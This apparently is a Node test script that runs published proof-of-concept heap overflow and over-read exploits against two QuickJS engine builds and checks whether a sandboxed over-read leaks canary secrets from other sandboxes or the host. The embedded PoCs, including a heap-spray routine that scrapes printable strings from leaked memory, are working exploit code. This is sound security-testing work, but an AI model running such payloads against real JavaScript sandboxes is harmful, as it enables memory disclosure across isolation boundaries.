// Real QuickJS memory-safety bugs in the engine we ship.
//
// The quickjs-emscripten 0.32.0 variant we use vendors bellard/quickjs commit
// f1139494 (2025-12-22). Upstream fixed several memory-safety bugs after it,
// two of whose reports name this very commit:
//   #477 heap buffer overflow in js_typed_array_sort (resize during sort)
//   #478 heap over-read in js_typed_array_constructor (resize from a getter)
//   #492 heap over-read in TypedArray.prototype.with (resize from valueOf),
//        which copies up to 4 KB of heap beyond a 4-byte buffer into a new
//        typed array that the script can read
// Part 1 runs each published PoC, adapted only to return its observations
// instead of printing them, in a plain context of each available engine:
// QuickJS f1139494 (ours) and QuickJS-ng (quickjs-emscripten 0.32.0 variant).
// Part 2 runs #492 as library code inside a sandbox, with a bystander sandbox
// (date-fns, Intl grant) and host canaries, and checks what the leaked bytes
// contain: the victim's own marker (positive control), and never the
// bystander's or the host's secrets.
//
// Run: node --import ./.sandbox/test/helpers/register-runtime-aliases.mjs eval-quickjs-bugs/run-pocs.mjs
import fs from "node:fs";
import { newQuickJSWASMModuleFromVariant } from "quickjs-emscripten-core";
import BELLARD from "@jitl/quickjs-wasmfile-release-sync";
import NG from "@jitl/quickjs-ng-wasmfile-release-sync";
import { sandbox } from "../eval-memsafety/lib.mjs";

const POCS = {
  "477-sort": `(() => {
    const out = { triggered: [] };
    for (const trigger of [1734, 1500, 1000, 1800, 2000, 500, 300, 100]) {
      const sz = 256, newSz = 10;
      const ab = new ArrayBuffer(sz, { maxByteLength: sz * 10 });
      const u8 = new Uint8Array(ab);
      for (let i = 0; i < sz; i++) u8[i] = i;
      u8[sz - 1] = 0;
      let cnt = 0, err = null;
      try { u8.sort((a, b) => { cnt++; if (cnt === trigger) { try { ab.resize(newSz); } catch (e) {} } return a - b; }); } catch (e) { err = String(e); }
      out.triggered.push({ trigger, comparisons: cnt, length: u8.length, err });
    }
    return JSON.stringify(out);
  })()`,
  "478-ctor": `(() => {
    const ab = new ArrayBuffer(10, { maxByteLength: 10 });
    const evil = (function f() { return 1337; }).bind();
    Object.defineProperty(evil, "prototype", { get: () => ab.resize() });
    let u8, err = null;
    try { u8 = Reflect.construct(Uint8Array, [ab], evil); } catch (e) { err = String(e); }
    return JSON.stringify({ err, length: u8 ? u8.length : null, byteLength: ab.byteLength });
  })()`,
  "492-with": `(() => {
    var ab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    var ta = new Int32Array(ab);
    for (var i = 0; i < ta.length; i++) ta[i] = 0x42424242;
    let result, err = null;
    try { result = ta.with(0, { valueOf() { ab.resize(4); return 999; } }); } catch (e) { err = String(e); }
    if (!result) return JSON.stringify({ err });
    let nonzero = 0; for (let i = 1; i < result.length; i++) if (result[i] !== 0) nonzero++;
    return JSON.stringify({ err, length: result.length, sourceByteLength: ab.byteLength, nonzeroBeyond: nonzero });
  })()`,
};

const report = { engines: {}, containment: null };
for (const [name, variant] of [["quickjs f1139494 (ours)", BELLARD], ["quickjs-ng (0.32.0 variant)", NG]]) {
  const mod = await newQuickJSWASMModuleFromVariant(variant);
  const res = {};
  for (const [poc, code] of Object.entries(POCS)) {
    const vm = mod.newContext();
    try {
      const r = vm.evalCode(code);
      if (r.error) { res[poc] = { threw: vm.dump(r.error) }; r.error.dispose(); }
      else { res[poc] = JSON.parse(vm.getString(r.value)); r.value.dispose(); }
    } catch (e) { res[poc] = { hostError: String(e).slice(0, 200) }; }
    try { vm.dispose(); } catch {}
  }
  report.engines[name] = res;
}

// ---------- Part 2: #492 as a compromised library, in our sandbox ----------
const HOST_SECRET = "host-secret-" + "9c41e7d2b8";
const BYSTANDER_SECRET = "bystander-secret-" + "5f0a3c";
globalThis.__hostSecret = HOST_SECRET; // a host string in the host heap
const B = await sandbox("bystander", "date-fns", ["Intl"]);
// Put the bystander's secret into the bystander's own QuickJS heap.
B.sb.vm.evalCode(`globalThis.__keep = ${JSON.stringify(BYSTANDER_SECRET)}.split("").join("")`).value?.dispose();
const bystanderExpected = B.sb.exports.format(new Date(Date.UTC(2020, 0, 2)), "yyyy-MM-dd");

const VICTIM = `
var __SANDBOXED_LIB__ = {
  leak: function (marker, rounds) {
    // Spray the victim's own heap with its marker, then over-read with #492.
    const keep = [];
    const found = { ownMarker: 0, bytes: 0, strings: [] };
    for (let r = 0; r < rounds; r++) {
      for (let i = 0; i < 64; i++) keep.push((marker + ":" + r + ":" + i).split("").join(""));
      const ab = new ArrayBuffer(4096, { maxByteLength: 4096 });
      const ta = new Int32Array(ab);
      const res = ta.with(0, { valueOf() { ab.resize(4); return 1; } });
      const bytes = new Uint8Array(res.buffer);
      found.bytes += bytes.length;
      let s = "";
      for (let i = 0; i < bytes.length; i++) s += (bytes[i] >= 32 && bytes[i] < 127) ? String.fromCharCode(bytes[i]) : (bytes[i] === 0 ? "" : ".");
      if (s.indexOf(marker) >= 0) found.ownMarker++;
      const m = s.match(/[ -~]{12,}/g) || [];
      for (const x of m) if (found.strings.length < 4000) found.strings.push(x);
    }
    return JSON.stringify(found);
  },
};`;
const V = await sandbox("victim", "victim", [], { code: VICTIM });
const ROUNDS = 200;
const leaked = JSON.parse(V.sb.exports.leak("victim-own-marker", ROUNDS));
const all = leaked.strings.join("\n");
const bystanderAfter = B.sb.exports.format(new Date(Date.UTC(2020, 0, 2)), "yyyy-MM-dd");
report.containment = {
  rounds: ROUNDS,
  bytesOverRead: leaked.bytes,
  roundsWithOwnMarker: leaked.ownMarker,
  printableRunsRecovered: leaked.strings.length,
  hostSecretLeaked: all.includes(HOST_SECRET) || all.includes("host-secret"),
  bystanderSecretLeaked: all.includes(BYSTANDER_SECRET) || all.includes("bystander-secret"),
  bystanderSecretInBystanderMemory: Buffer.from(B.memory.buffer).includes(Buffer.from(BYSTANDER_SECRET)),
  bystanderCorrectAfter: bystanderAfter === bystanderExpected,
  sampleLeakedRuns: leaked.strings.filter((x) => !x.includes("victim-own-marker")).slice(0, 8),
};
fs.writeFileSync(new URL("./pocs-results.json", import.meta.url), JSON.stringify(report, null, 1));
console.log(JSON.stringify(report, null, 1));
process.exit(0);
